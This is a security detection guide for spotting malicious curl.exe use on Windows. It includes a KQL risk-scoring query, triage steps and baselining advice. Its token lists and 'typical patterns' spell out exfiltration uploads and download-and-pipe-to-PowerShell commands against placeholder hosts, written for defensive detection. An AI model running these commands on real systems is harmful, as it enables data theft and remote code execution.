# curl.exe LOLBIN Detection (L3 – Production, Native MDE/Sentinel)
**Author: Ala Dabat (Alstrum)**  
**Purpose:** High-fidelity, low-noise detection of malicious curl.exe usage (downloaders, C2, exfiltration).  
**Scope:** Microsoft Defender for Endpoint — Production Ready

---

## 1. Threat Overview

`curl.exe` is bundled natively with Windows and is used heavily in malicious intrusion chains. Common abuse includes:

- Downloading payloads (EXE/DLL/PS1/ZIP) into user-writable paths  
- Exfiltrating sensitive data using `--upload-file`, POST/PUT, or `--data-binary`  
- Fileless execution via pipes (`curl … | powershell -`)  
- Blending into DevOps/admin workflows to evade detection  
- Execution via rare parent processes (Office, browser, helpdesk tools, scheduled tasks)

Detection focuses on **switch usage + URL context + output location + parent process + account type**, not curl.exe itself.

---

## 2. MITRE ATT&CK Techniques

- **T1105 – Ingress Tool Transfer**  
- **T1071.001 – Application Layer Protocol: Web Protocols**  
- **T1041 / T1567 – Exfiltration Over Web Services**

---

## 3. Advanced Hunting Query (L3 — Native Only, Low Noise)


```kql
// ======================================================================
// curl.exe LOLBIN Detection (L3 – Production, Native)
// Author: Ala Dabat 
// ======================================================================

let lookback = 7d;
let AllowedParents = dynamic(["powershell.exe","pwsh.exe","cmd.exe","explorer.exe"]);
let HighValueAccounts = dynamic(["Administrator","Domain Admin","Enterprise Admin"]);
let UrlTokens = dynamic(["http://","https://","ftp://"]);
let DownloadSwitchTokens = dynamic([" -o ", "--output", " -O ", "--remote-name", "--remote-name-all"]);
let ExfilSwitchTokens = dynamic(["--upload-file"," -T ","--data","--data-binary","--data-raw","-X POST","-X PUT"]);
let UserWritableTokens = dynamic(["\\Users\\","\\Users\\Public\\","\\AppData\\","\\Temp\\","\\ProgramData\\","Desktop","Downloads"]);
let ArchiveTokens = dynamic([".zip",".7z",".rar",".gz",".tar"]);
let ExecChainTokens = dynamic(["| powershell","&& powershell","| pwsh","&& pwsh","| cmd","&& cmd",".ps1",".bat",".vbs",".js"]);
let StealthTokens = dynamic([" -k ","--insecure"," -s ","--silent","--connect-timeout","--max-time","--retry","--retry-delay"]);

DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName =~ "curl.exe"
| extend ParentImage=tostring(InitiatingProcessFileName), ParentCmd=tostring(InitiatingProcessCommandLine), Cmd=tostring(ProcessCommandLine), Account=tostring(AccountName)
| extend HasUrl=Cmd has_any(UrlTokens), HasDownloadSw=Cmd has_any(DownloadSwitchTokens), HasExfilSw=Cmd has_any(ExfilSwitchTokens), WritesUserPath=HasDownloadSw and Cmd has_any(UserWritableTokens), HasArchive=Cmd has_any(ArchiveTokens), HasExecChain=Cmd has_any(ExecChainTokens), HasStealthSw=Cmd has_any(StealthTokens), IsRareParent=iif(ParentImage !in (AllowedParents),1,0), IsPrivAccount=iif(Account in (HighValueAccounts),1,0)
| extend RiskScore = 0.0 + 2.0*todouble(HasUrl) + 2.0*todouble(HasDownloadSw) + 3.0*todouble(HasExfilSw) + 2.0*todouble(WritesUserPath) + 2.0*todouble(HasExecChain) + 1.0*todouble(HasStealthSw) + 1.0*todouble(HasArchive) + 1.0*todouble(IsRareParent) + 1.0*todouble(IsPrivAccount)
| extend DetectionTier=case(RiskScore>=8.0,"High",RiskScore>=4.0,"Medium","Low")
| extend SuspiciousReason=case(
    HasExfilSw and HasArchive,"curl uploading archive (likely exfil).",
    HasDownloadSw and HasExecChain and WritesUserPath,"curl downloading into writable path and piping to interpreter.",
    HasDownloadSw and HasUrl and IsRareParent==1,"curl downloader from rare parent with URL + output switches.",
    HasExfilSw,"curl upload/POST/PUT usage (possible data exfil).",
    HasUrl and HasStealthSw,"curl HTTP(S) with stealth/insecure flags.",
    IsRareParent==1,"curl spawned from rare parent.",
    IsPrivAccount==1,"curl executed under privileged account.",
    "Unusual curl.exe usage — investigate.")
| extend HuntingDirectives=case(
    DetectionTier=="High","Isolate device. Reconstruct process tree. Inspect downloads/uploads. Pivot into FileEvents & NetworkEvents (+/-2h). Identify exfil volumes. Locate output archives or scripts. Search for same host/URL across estate.",
    DetectionTier=="Medium","Validate host & user role. Review parent process & output path. Pivot to similar curl patterns. Escalate if uncommon.",
    "Baseline candidate. Confirm legitimacy with owners. Document if recurring."
)
| project Timestamp,DeviceId,DeviceName,FileName,Cmd,ParentImage,ParentCmd,AccountName=Account,InitiatingProcessAccountName,DetectionTier,RiskScore,SuspiciousReason,HuntingDirectives,HasUrl,HasDownloadSw,HasExfilSw,HasArchive,HasExecChain,HasStealthSw,WritesUserPath,IsRareParent,IsPrivAccount,ReportId
| order by Timestamp desc
```
Key properties:

- Leverages `InitiatingProcessFileName` and `ProcessCommandLine` for context.
- Treats rare parents and encoded / network‑touching commands as primary signal.
- Provides a `SuspiciousReason` column to explain why the row is interesting.
- Surfaces privileged accounts separately for accelerated triage.

4. Hunter Directives & L3 Pivot Strategy
Use DetectionTier and SuspiciousReason as your triage compass.

4.1 High – Likely Malicious (Immediate Action)
Typical Patterns

curl -T out.zip http://x.x.x.x/out.zip → archive exfiltration
curl https://host/payload.exe -o C:\Users\…\Temp\payload.exe from unknown infrastructure
curl https://host/script.ps1 | powershell - → fileless execution
curl spawned by Office / browser / RMM / helpdesk / scheduled tasks

Actions
Containment

Consider MDE isolation when:
Large uploads or repeated POST/PUT patterns
Downloaded payloads executed or dropped malware
Process Tree Reconstruction
Re-run DeviceProcessEvents (same DeviceId & ReportId or ±2h)

Focus on:

Script engines: powershell.exe, pwsh.exe, wscript.exe, cscript.exe

Droppers/launchers: cmd.exe, LOLBIN chains
Archivers: 7z.exe, rar.exe, tar.exe
Encryption/ransomware tools
File & Archive Inspection
Inspect output files: EXE, DLL, PS1, ZIP, TAR
Check creation time vs execution

For upload activity:
Locate archives: out.zip, backup.tar.gz
Inspect contents if possible
Network & Scope

Pivot to DeviceNetworkEvents:
Endpoints, ports, byte counts
Repeated upload or C2 behaviour

Re-run this curl rule filtered by:
Same host
Same URL path
Same command pattern
Scope & Impact Assessment

Determine:
What data was transferred
Whether other hosts contacted same infra
Whether it was targeted exfiltration or mass staging

4.2 Medium – Suspicious but Possibly Legitimate
Typical Patterns
curl downloading binaries/scripts via -o into user paths from internal hosts
curl POSTing to internal APIs
Rare parents or non-admin users invoking curl atypically

Actions
Context Validation

Check:
User role (DevOps/admin vs normal user)
Parent process (automation tool vs Office)
Domain reputation (internal vs external)
Pattern & Frequency Analysis
Filter by:
Cmd has "<domain>"
URL path fragment

Ask:

Is this common across multiple hosts?

Is timing consistent with known workflows?

Lightweight Forensics
Review child processes of curl
Check for related alerts on same endpoint

Decision
Benign & recurring → baseline
New/odd → track and escalate if repeated

4.3 Low – Baseline Candidate / Watch-List
Typical Patterns
curl to internal hosts without suspicious switches
Rare-parent triggers with benign commands
Actions
Quick Check

Validate with system owners:
Developer pipelines
CI/CD automation
Monitoring scripts
Config management tools
Baseline or Monitor
Recurring & benign → document
One-off & harmless → watch-list

5. Baselining & Suppression (Low Noise in Production)
Baseline curl Usage (14–30 days)

Summarise:
ParentImage
URL hosts
Switch patterns
User roles
Device types
Identify Known Good Patterns

Examples:
DevOps fetching packages
Internal API queries
CI/CD agents pulling artifacts
Create Scoped Allow-Patterns
Avoid global “ignore curl.exe”.
Use scoped expressions such as:
ParentImage == "powershell.exe"
AND Cmd has "https://artifacts.corp.local"


Scope these to:
Dev servers
Build pipelines
Engineering workstations
Regular Re-Baselining

When:
New DevOps tooling deployed
Monitoring agent updates
New internal APIs/services appear
Recommended Deployment
Start in hunt-only mode
Validate all High detections
Promote selected Medium detections when stable
Keep HuntingDirectives visible in alert descriptions

## 6. CTI / MISP / OpenCTI Integration

For confirmed malicious instances:

- Extract:
  - File hashes of payloads and staging artefacts.
  - Domains, IPs, URIs observed in network connections.
- Push to MISP/OpenCTI as:
  - Attributes on existing intrusion sets where appropriate.
  - New events where this represents a new cluster or campaign.
- Tag events with:
  - Confidence level,
  - Kill‑chain phase,
  - Detection source (LOLBIN MDE rule, Sentinel analytic).

This turns a single host‑level detection into durable intelligence.
